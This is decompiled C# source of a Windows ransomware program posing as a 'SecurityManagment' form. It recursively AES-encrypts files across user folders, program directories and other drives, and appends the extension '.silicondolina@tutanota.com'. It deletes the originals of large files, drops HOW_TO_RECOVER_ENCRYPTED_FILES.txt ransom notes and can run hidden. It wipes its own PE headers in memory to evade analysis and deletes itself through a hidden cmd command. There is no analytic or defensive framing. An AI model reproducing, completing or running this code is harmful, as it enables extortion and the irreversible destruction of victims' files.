using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using UHWID;
using WindowsFormsApp1.Properties;

namespace SecurityManagment;

public class Form1 : Form
{
	private string string_0;

	public static int skolko;

	public static List<string> l1;

	public static List<string> l2;

	public static List<string> l3;

	public static List<string> l4;

	public static List<string> l5;

	private static bool bool_0;

	private string string_1;

	private string JokyiZercm;

	private IContainer icontainer_0;

	private TextBox t1;

	private TextBox t2;

	private TextBox t3;

	private TextBox t4;

	private BackgroundWorker backgroundWorker_0;

	private BackgroundWorker backgroundWorker_1;

	private BackgroundWorker backgroundWorker_2;

	private BackgroundWorker backgroundWorker_3;

	private Button button2;

	private Button b1;

	private Button b2;

	private Button b4;

	private Button b3;

	private Button button3;

	private Label tskolko;

	private Button button1;

	private TextBox taidi;

	private TextBox tkluch;

	private TextBox treplacemail;

	private TextBox treplacefile;

	public Form1(string dane = "ne")
	{
		Class9.T7DkdFQzGSTU8();
		string_0 = "ne";
		string_1 = "LHDFBGLJDBGFLJDNSHFKFNDNDNDNSJSDFHJHVJHYTRUERYTGJSHDFSSDF";
		JokyiZercm = "afs'dkjfbas'kdfjb'kjbasdhiub3iu42bi'ud5casddsfsdgdfgdfg";
		((Form)this)._002Ector();
		string_0 = dane;
		InitializeComponent();
	}

	public static string postoyparavoz(string input, string pass)
	{
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string result = "";
		try
		{
			byte[] array = new byte[24];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 8);
			tripleDESCryptoServiceProvider.Key = array;
			tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
			byte[] bytes = Encoding.ASCII.GetBytes(input);
			result = Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		smethod_0();
		UHWIDEngine uHWIDEngine = new UHWIDEngine();
		uHWIDEngine.UhwidEngine();
		JokyiZercm = uHWIDEngine.AdvancedUid + uHWIDEngine.SimpleUid;
		string_1 = postoyparavoz(JokyiZercm, "zalupakonyabudulaya");
		((Control)tkluch).set_Text(CreateID(128));
		((Control)taidi).set_Text(string_1);
		((Control)t3).set_Text("C:\\Users");
		((TextBoxBase)t4).AppendText("C:\\ProgramData\r\nC:\\Program Files\r\nC:\\Program Files (x86)");
		DirectoryInfo[] directories = new DirectoryInfo("C:\\").GetDirectories();
		for (int i = 0; i < directories.Length; i++)
		{
			string fullName = directories[i].FullName;
			if (!fullName.Equals("C:\\windows", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\$Recycle.Bin", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\System Volume Information", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\PerfLogs", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\Intel", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\MSOCache", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\Users", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\Documents and Settings", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\ProgramData", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\Program Files", StringComparison.InvariantCultureIgnoreCase) && !fullName.Equals("C:\\Program Files (x86)", StringComparison.InvariantCultureIgnoreCase))
			{
				((TextBoxBase)t1).AppendText(fullName + Environment.NewLine);
			}
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.Name != "C:\\")
			{
				((TextBoxBase)t2).AppendText(driveInfo.Name + Environment.NewLine);
			}
		}
		if (string_0 == "da")
		{
			((Form)this).set_Opacity(0.0);
			((Form)this).set_ShowInTaskbar(false);
			((Control)b1).set_Enabled(false);
			backgroundWorker_0.RunWorkerAsync();
			((Control)b2).set_Enabled(false);
			backgroundWorker_1.RunWorkerAsync();
			((Control)b3).set_Enabled(false);
			backgroundWorker_2.RunWorkerAsync();
			((Control)b4).set_Enabled(false);
			backgroundWorker_3.RunWorkerAsync();
			((Form)this).set_Opacity(0.0);
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_ShowIcon(false);
			((Control)this).Hide();
			((Control)this).set_Visible(false);
		}
	}

	private void method_0(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(100.0);
	}

	public byte[] pishkom(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public string CreateID(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZ"[random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZ".Length)]);
		}
		return stringBuilder.ToString();
	}

	private void method_1()
	{
		((Control)taidi).set_Text(CreateID(128));
		((Control)tkluch).set_Text(CreatePassword(128));
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = pishkom(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".silicondolina@tutanota.com");
	}

	public void encryptDirectory(string location, string password)
	{
		_003C_003Ec__DisplayClass19_0 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass19_0();
		CS_0024_003C_003E8__locals0._003C_003E4__this = this;
		CS_0024_003C_003E8__locals0.password = password;
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			files.ToList().ForEach(delegate(string file)
			{
				try
				{
					try
					{
						if (!Path.GetFileName(file)!.Contains("HOW_TO_RECOVER_ENCRYPTED_FILES") && !Path.GetFileName(file)!.Contains(".silicondolina@tutanota.com"))
						{
							if (new FileInfo(file).Length > 381417467L)
							{
								try
								{
									if (((Form)CS_0024_003C_003E8__locals0._003C_003E4__this).get_Opacity() != 0.0)
									{
										skolko++;
										((Control)CS_0024_003C_003E8__locals0._003C_003E4__this.tskolko).set_Text(skolko.ToString());
									}
									CS_0024_003C_003E8__locals0._003C_003E4__this.method_3(file, CS_0024_003C_003E8__locals0.password);
									return;
								}
								catch
								{
									return;
								}
								finally
								{
									skolko++;
									try
									{
										File.Delete(file);
									}
									catch
									{
									}
								}
							}
							try
							{
								if (((Form)CS_0024_003C_003E8__locals0._003C_003E4__this).get_Opacity() != 0.0)
								{
									skolko++;
									((Control)CS_0024_003C_003E8__locals0._003C_003E4__this.tskolko).set_Text(skolko.ToString());
								}
								CS_0024_003C_003E8__locals0._003C_003E4__this.EncryptFile(file, CS_0024_003C_003E8__locals0.password);
								return;
							}
							catch
							{
								return;
							}
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
			});
			for (int i = 0; i < directories.Length; i++)
			{
				encryptDirectory(directories[i], CS_0024_003C_003E8__locals0.password);
			}
			string[] array = directories;
			foreach (string text in array)
			{
				try
				{
					File.WriteAllText(text + "\\HOW_TO_RECOVER_ENCRYPTED_FILES.txt", Resources.smethod_0().Replace("[zalupaid]", string_1));
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public void ReplaceDirectory(string location, string password)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			files.ToList().ForEach(delegate(string string_2)
			{
				try
				{
					try
					{
						_ = Path.GetFileName(string_2)!.ToLower() == ((Control)treplacefile).get_Text().ToLower();
						try
						{
							File.WriteAllText(string_2, Resources.smethod_0().Replace("[zalupaid]", string_1));
							skolko++;
							((Control)tskolko).set_Text(skolko.ToString());
						}
						catch
						{
						}
						if (Path.GetFileName(string_2)!.Contains(((Control)treplacemail).get_Text()))
						{
							try
							{
								File.Move(string_2, string_2.Replace(((Control)treplacemail).get_Text(), "silicondolina@tutanota.com"));
								skolko++;
								((Control)tskolko).set_Text(skolko.ToString());
								return;
							}
							catch
							{
								return;
							}
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
			});
			for (int i = 0; i < directories.Length; i++)
			{
				ReplaceDirectory(directories[i], password);
			}
		}
		catch
		{
		}
	}

	private void method_2()
	{
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.get_ExecutablePath(),
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		ProjectData.EndApp();
	}

	private void method_3(string string_2, string string_3)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(string_2 + ".silicondolina@tutanota.com", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(string_3);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(string_2, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			cryptoStream.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	private void method_4(object sender, EventArgs e)
	{
	}

	private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
	{
		if (!(((Control)t1).get_Text() != ""))
		{
			return;
		}
		string[] lines = ((TextBoxBase)t1).get_Lines();
		((Control)t1).set_Enabled(false);
		string[] array = lines;
		foreach (string location in array)
		{
			if (!bool_0)
			{
				try
				{
					encryptDirectory(location, JokyiZercm);
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					ReplaceDirectory(location, JokyiZercm);
				}
				catch
				{
				}
			}
		}
	}

	private void backgroundWorker_1_DoWork(object sender, DoWorkEventArgs e)
	{
		if (!(((Control)t2).get_Text() != ""))
		{
			return;
		}
		string[] lines = ((TextBoxBase)t2).get_Lines();
		((Control)t2).set_Enabled(false);
		string[] array = lines;
		foreach (string location in array)
		{
			if (!bool_0)
			{
				try
				{
					encryptDirectory(location, JokyiZercm);
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					ReplaceDirectory(location, JokyiZercm);
				}
				catch
				{
				}
			}
		}
	}

	private void backgroundWorker_2_DoWork(object sender, DoWorkEventArgs e)
	{
		if (!(((Control)t3).get_Text() != ""))
		{
			return;
		}
		string[] lines = ((TextBoxBase)t3).get_Lines();
		((Control)t3).set_Enabled(false);
		string[] array = lines;
		foreach (string location in array)
		{
			if (!bool_0)
			{
				try
				{
					encryptDirectory(location, JokyiZercm);
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					ReplaceDirectory(location, JokyiZercm);
				}
				catch
				{
				}
			}
		}
	}

	private void backgroundWorker_3_DoWork(object sender, DoWorkEventArgs e)
	{
		if (!(((Control)t4).get_Text() != ""))
		{
			return;
		}
		string[] lines = ((TextBoxBase)t4).get_Lines();
		((Control)t4).set_Enabled(false);
		string[] array = lines;
		foreach (string location in array)
		{
			if (!bool_0)
			{
				try
				{
					encryptDirectory(location, JokyiZercm);
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					ReplaceDirectory(location, JokyiZercm);
				}
				catch
				{
				}
			}
		}
	}

	private void backgroundWorker_0_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		((Control)t1).set_Text("Complite");
		if (((Control)t1).get_Text() == "Complite" && ((Control)t2).get_Text() == "Complite" && ((Control)t3).get_Text() == "Complite" && ((Control)t4).get_Text() == "Complite")
		{
			method_2();
		}
	}

	private void backgroundWorker_1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		((Control)t2).set_Text("Complite");
		if (((Control)t1).get_Text() == "Complite" && ((Control)t2).get_Text() == "Complite" && ((Control)t3).get_Text() == "Complite" && ((Control)t4).get_Text() == "Complite")
		{
			method_2();
		}
	}

	private void backgroundWorker_2_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		((Control)t3).set_Text("Complite");
		if (((Control)t1).get_Text() == "Complite" && ((Control)t2).get_Text() == "Complite" && ((Control)t3).get_Text() == "Complite" && ((Control)t4).get_Text() == "Complite")
		{
			method_2();
		}
	}

	private void backgroundWorker_3_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		((Control)t4).set_Text("Complite");
		if (((Control)t1).get_Text() == "Complite" && ((Control)t2).get_Text() == "Complite" && ((Control)t3).get_Text() == "Complite" && ((Control)t4).get_Text() == "Complite")
		{
			method_2();
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_ShowIcon(false);
		((Control)this).Hide();
		((Control)this).set_Visible(false);
	}

	private void QkdyyuIal1(object sender, EventArgs e)
	{
	}

	private void b1_Click(object sender, EventArgs e)
	{
		((Control)b1).set_Enabled(false);
		backgroundWorker_0.RunWorkerAsync();
	}

	private void b2_Click(object sender, EventArgs e)
	{
		((Control)b2).set_Enabled(false);
		backgroundWorker_1.RunWorkerAsync();
	}

	private void feaywPbmBh(object sender, EventArgs e)
	{
		((Control)b3).set_Enabled(false);
		((Control)t3).set_Enabled(false);
		backgroundWorker_2.RunWorkerAsync();
	}

	private void b4_Click(object sender, EventArgs e)
	{
		((Control)b4).set_Enabled(false);
		((Control)t4).set_Enabled(false);
		backgroundWorker_3.RunWorkerAsync();
	}

	private void button3_Click(object sender, EventArgs e)
	{
		method_2();
	}

	private void method_5(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		method_1();
	}

	[DllImport("tXibPSdyno.dll")]
	private static extern int[] JxOIgKwAkr(StringComparer stringComparer_0, string string_2);

	[DllImport("kernel32.dll")]
	private unsafe static extern bool VirtualProtect(byte* pByte_0, int int_0, uint uint_0, out uint uint_1);

	private unsafe static void smethod_0()
	{
		Module module = typeof(Form1).Module;
		byte* ptr = (byte*)(void*)Marshal.GetHINSTANCE(module);
		byte* ptr2 = ptr + 60;
		ptr2 = ptr + (uint)(*(int*)ptr2);
		ptr2 += 6;
		ushort num = *(ushort*)ptr2;
		ptr2 += 14;
		ushort num2 = *(ushort*)ptr2;
		ptr2 = ptr2 + 4 + (int)num2;
		byte* ptr3 = stackalloc byte[11];
		uint uint_;
		if (module.FullyQualifiedName[0] != '<')
		{
			byte* ptr4 = ptr + (uint)(*(int*)(ptr2 - 16));
			if (*(uint*)(ptr2 - 120) != 0)
			{
				byte* ptr5 = ptr + (uint)(*(int*)(ptr2 - 120));
				byte* ptr6 = ptr + (uint)(*(int*)ptr5);
				byte* ptr7 = ptr + (uint)(*(int*)(ptr5 + 12));
				byte* ptr8 = ptr + (uint)(*(int*)ptr6) + 2;
				VirtualProtect(ptr7, 11, 64u, out uint_);
				*(int*)ptr3 = 1818522734;
				*(int*)(ptr3 + 4) = 1818504812;
				*(short*)(ptr3 + (nint)4 * (nint)2) = 108;
				ptr3[10] = 0;
				for (int i = 0; i < 11; i++)
				{
					ptr7[i] = ptr3[i];
				}
				VirtualProtect(ptr8, 11, 64u, out uint_);
				*(int*)ptr3 = 1866691662;
				*(int*)(ptr3 + 4) = 1852404846;
				*(short*)(ptr3 + (nint)4 * (nint)2) = 25973;
				ptr3[10] = 0;
				for (int j = 0; j < 11; j++)
				{
					ptr8[j] = ptr3[j];
				}
			}
			for (int k = 0; k < num; k++)
			{
				VirtualProtect(ptr2, 8, 64u, out uint_);
				Marshal.Copy(new byte[8], 0, (IntPtr)ptr2, 8);
				ptr2 += 40;
			}
			VirtualProtect(ptr4, 72, 64u, out uint_);
			byte* ptr9 = ptr + (uint)(*(int*)(ptr4 + 8));
			*(int*)ptr4 = 0;
			*(int*)(ptr4 + 4) = 0;
			*(int*)(ptr4 + (nint)2 * (nint)4) = 0;
			*(int*)(ptr4 + (nint)3 * (nint)4) = 0;
			VirtualProtect(ptr9, 4, 64u, out uint_);
			*(int*)ptr9 = 0;
			ptr9 += 12;
			ptr9 += (uint)(*(int*)ptr9);
			ptr9 = (byte*)(((ulong)ptr9 + 7uL) & 0xFFFFFFFFFFFFFFFCuL);
			ptr9 += 2;
			ushort num3 = *ptr9;
			ptr9 += 2;
			for (int l = 0; l < num3; l++)
			{
				VirtualProtect(ptr9, 8, 64u, out uint_);
				ptr9 += 4;
				ptr9 += 4;
				for (int m = 0; m < 8; m++)
				{
					VirtualProtect(ptr9, 4, 64u, out uint_);
					*ptr9 = 0;
					ptr9++;
					if (*ptr9 != 0)
					{
						*ptr9 = 0;
						ptr9++;
						if (*ptr9 != 0)
						{
							*ptr9 = 0;
							ptr9++;
							if (*ptr9 != 0)
							{
								*ptr9 = 0;
								ptr9++;
								continue;
							}
							ptr9++;
							break;
						}
						ptr9 += 2;
						break;
					}
					ptr9 += 3;
					break;
				}
			}
			return;
		}
		uint num4 = *(uint*)(ptr2 - 16);
		uint num5 = *(uint*)(ptr2 - 120);
		uint[] array = new uint[num];
		uint[] array2 = new uint[num];
		uint[] array3 = new uint[num];
		for (int n = 0; n < num; n++)
		{
			VirtualProtect(ptr2, 8, 64u, out uint_);
			Marshal.Copy(new byte[8], 0, (IntPtr)ptr2, 8);
			array[n] = *(uint*)(ptr2 + 12);
			array2[n] = *(uint*)(ptr2 + 8);
			array3[n] = *(uint*)(ptr2 + 20);
			ptr2 += 40;
		}
		if (num5 != 0)
		{
			for (int num6 = 0; num6 < num; num6++)
			{
				if (array[num6] <= num5 && num5 < array[num6] + array2[num6])
				{
					num5 = num5 - array[num6] + array3[num6];
					break;
				}
			}
			byte* ptr10 = ptr + num5;
			uint num7 = *(uint*)ptr10;
			for (int num8 = 0; num8 < num; num8++)
			{
				if (array[num8] <= num7 && num7 < array[num8] + array2[num8])
				{
					num7 = num7 - array[num8] + array3[num8];
					break;
				}
			}
			byte* ptr11 = ptr + num7;
			uint num9 = *(uint*)(ptr10 + 12);
			for (int num10 = 0; num10 < num; num10++)
			{
				if (array[num10] <= num9 && num9 < array[num10] + array2[num10])
				{
					num9 = num9 - array[num10] + array3[num10];
					break;
				}
			}
			uint num11 = *(uint*)ptr11 + 2;
			for (int num12 = 0; num12 < num; num12++)
			{
				if (array[num12] <= num11 && num11 < array[num12] + array2[num12])
				{
					num11 = num11 - array[num12] + array3[num12];
					break;
				}
			}
			VirtualProtect(ptr + num9, 11, 64u, out uint_);
			*(int*)ptr3 = 1818522734;
			*(int*)(ptr3 + 4) = 1818504812;
			*(short*)(ptr3 + (nint)4 * (nint)2) = 108;
			ptr3[10] = 0;
			for (int num13 = 0; num13 < 11; num13++)
			{
				(ptr + num9)[num13] = ptr3[num13];
			}
			VirtualProtect(ptr + num11, 11, 64u, out uint_);
			*(int*)ptr3 = 1866691662;
			*(int*)(ptr3 + 4) = 1852404846;
			*(short*)(ptr3 + (nint)4 * (nint)2) = 25973;
			ptr3[10] = 0;
			for (int num14 = 0; num14 < 11; num14++)
			{
				(ptr + num11)[num14] = ptr3[num14];
			}
		}
		for (int num15 = 0; num15 < num; num15++)
		{
			if (array[num15] <= num4 && num4 < array[num15] + array2[num15])
			{
				num4 = num4 - array[num15] + array3[num15];
				break;
			}
		}
		byte* ptr12 = ptr + num4;
		VirtualProtect(ptr12, 72, 64u, out uint_);
		uint num16 = *(uint*)(ptr12 + 8);
		for (int num17 = 0; num17 < num; num17++)
		{
			if (array[num17] <= num16 && num16 < array[num17] + array2[num17])
			{
				num16 = num16 - array[num17] + array3[num17];
				break;
			}
		}
		*(int*)ptr12 = 0;
		*(int*)(ptr12 + 4) = 0;
		*(int*)(ptr12 + (nint)2 * (nint)4) = 0;
		*(int*)(ptr12 + (nint)3 * (nint)4) = 0;
		byte* ptr13 = ptr + num16;
		VirtualProtect(ptr13, 4, 64u, out uint_);
		*(int*)ptr13 = 0;
		ptr13 += 12;
		ptr13 += (uint)(*(int*)ptr13);
		ptr13 = (byte*)(((ulong)ptr13 + 7uL) & 0xFFFFFFFFFFFFFFFCuL);
		ptr13 += 2;
		ushort num18 = *ptr13;
		ptr13 += 2;
		for (int num19 = 0; num19 < num18; num19++)
		{
			VirtualProtect(ptr13, 8, 64u, out uint_);
			ptr13 += 4;
			ptr13 += 4;
			for (int num20 = 0; num20 < 8; num20++)
			{
				VirtualProtect(ptr13, 4, 64u, out uint_);
				*ptr13 = 0;
				ptr13++;
				if (*ptr13 != 0)
				{
					*ptr13 = 0;
					ptr13++;
					if (*ptr13 != 0)
					{
						*ptr13 = 0;
						ptr13++;
						if (*ptr13 != 0)
						{
							*ptr13 = 0;
							ptr13++;
							continue;
						}
						ptr13++;
						break;
					}
					ptr13 += 2;
					break;
				}
				ptr13 += 3;
				break;
			}
		}
	}

	private void t3_TextChanged(object sender, EventArgs e)
	{
	}

	private void t4_TextChanged(object sender, EventArgs e)
	{
	}

	private void tskolko_DoubleClick(object sender, EventArgs e)
	{
		JokyiZercm = CreatePassword(64);
		string_1 = postoyparavoz(JokyiZercm, "zalupakonyabudulaya");
	}

	private void treplacemail_TextChanged(object sender, EventArgs e)
	{
		if (((Control)treplacemail).get_Text() != "")
		{
			((Control)treplacefile).set_Enabled(true);
			bool_0 = true;
		}
		else
		{
			bool_0 = false;
			((Control)treplacefile).set_Enabled(false);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_0698: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a2: Expected O, but got Unknown
		t1 = new TextBox();
		t2 = new TextBox();
		t3 = new TextBox();
		t4 = new TextBox();
		backgroundWorker_0 = new BackgroundWorker();
		backgroundWorker_1 = new BackgroundWorker();
		backgroundWorker_2 = new BackgroundWorker();
		backgroundWorker_3 = new BackgroundWorker();
		button2 = new Button();
		b1 = new Button();
		b2 = new Button();
		b4 = new Button();
		b3 = new Button();
		button3 = new Button();
		tskolko = new Label();
		button1 = new Button();
		taidi = new TextBox();
		tkluch = new TextBox();
		treplacemail = new TextBox();
		treplacefile = new TextBox();
		((Control)this).SuspendLayout();
		((Control)t1).set_Location(new Point(3, 81));
		((TextBoxBase)t1).set_Multiline(true);
		((Control)t1).set_Name("t1");
		t1.set_ScrollBars((ScrollBars)3);
		((Control)t1).set_Size(new Size(219, 166));
		((Control)t1).set_TabIndex(0);
		((TextBoxBase)t1).set_WordWrap(false);
		((Control)t2).set_Location(new Point(229, 83));
		((TextBoxBase)t2).set_Multiline(true);
		((Control)t2).set_Name("t2");
		t2.set_ScrollBars((ScrollBars)3);
		((Control)t2).set_Size(new Size(256, 166));
		((Control)t2).set_TabIndex(0);
		((TextBoxBase)t2).set_WordWrap(false);
		((Control)t3).set_Anchor((AnchorStyles)7);
		((Control)t3).set_Location(new Point(3, 253));
		((TextBoxBase)t3).set_Multiline(true);
		((Control)t3).set_Name("t3");
		t3.set_ScrollBars((ScrollBars)3);
		((Control)t3).set_Size(new Size(219, 131));
		((Control)t3).set_TabIndex(0);
		((TextBoxBase)t3).set_WordWrap(false);
		((Control)t3).add_TextChanged((EventHandler)t3_TextChanged);
		((Control)t4).set_Anchor((AnchorStyles)7);
		((Control)t4).set_Location(new Point(228, 255));
		((TextBoxBase)t4).set_Multiline(true);
		((Control)t4).set_Name("t4");
		t4.set_ScrollBars((ScrollBars)3);
		((Control)t4).set_Size(new Size(256, 131));
		((Control)t4).set_TabIndex(0);
		((TextBoxBase)t4).set_WordWrap(false);
		((Control)t4).add_TextChanged((EventHandler)t4_TextChanged);
		backgroundWorker_0.DoWork += backgroundWorker_0_DoWork;
		backgroundWorker_0.RunWorkerCompleted += backgroundWorker_0_RunWorkerCompleted;
		backgroundWorker_1.DoWork += backgroundWorker_1_DoWork;
		backgroundWorker_1.RunWorkerCompleted += backgroundWorker_1_RunWorkerCompleted;
		backgroundWorker_2.DoWork += backgroundWorker_2_DoWork;
		backgroundWorker_2.RunWorkerCompleted += backgroundWorker_2_RunWorkerCompleted;
		backgroundWorker_3.DoWork += backgroundWorker_3_DoWork;
		backgroundWorker_3.RunWorkerCompleted += backgroundWorker_3_RunWorkerCompleted;
		((Control)button2).set_Location(new Point(3, 3));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(2);
		((Control)button2).set_Text("Hide");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)b1).set_Location(new Point(124, 76));
		((Control)b1).set_Name("b1");
		((Control)b1).set_Size(new Size(75, 23));
		((Control)b1).set_TabIndex(4);
		((Control)b1).set_Text("Start");
		((ButtonBase)b1).set_UseVisualStyleBackColor(true);
		((Control)b1).add_Click((EventHandler)b1_Click);
		((Control)b2).set_Location(new Point(391, 83));
		((Control)b2).set_Name("b2");
		((Control)b2).set_Size(new Size(75, 23));
		((Control)b2).set_TabIndex(4);
		((Control)b2).set_Text("Start");
		((ButtonBase)b2).set_UseVisualStyleBackColor(true);
		((Control)b2).add_Click((EventHandler)b2_Click);
		((Control)b4).set_Location(new Point(391, 261));
		((Control)b4).set_Name("b4");
